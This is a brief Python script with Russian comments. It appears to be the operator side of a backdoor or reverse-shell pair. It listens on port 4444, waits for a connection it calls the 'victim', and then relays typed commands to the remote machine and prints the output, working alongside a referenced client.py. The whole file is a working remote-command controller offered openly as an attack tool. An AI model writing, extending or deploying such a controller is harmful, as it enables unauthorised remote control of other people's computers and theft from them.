import socket

def Main():
    host = 'localhost' #Т акже как и в client.py
    port = 4444 # Также как и в client.py
    soc = socket.socket()# Cоздаем сокет
    soc.bind((host,port)) # занимаем порт и ip
    soc.listen(1) # принимаем только одного клиента
    print("Wait victim...")
    connection,address = soc.accept()
    print(" Sucsessfull connection " +str(address))
    while True:
        try:
            toSend = input("SendCommand ->")
            connection.send(toSend.encode()) # Send command
            data = connection.recv(1024).decode()
            print(data) # Полученная информация выводится на экран
        except:
            break
    print("Connection refused")
    connection.close()

if __name__ == "__main__":
    Main()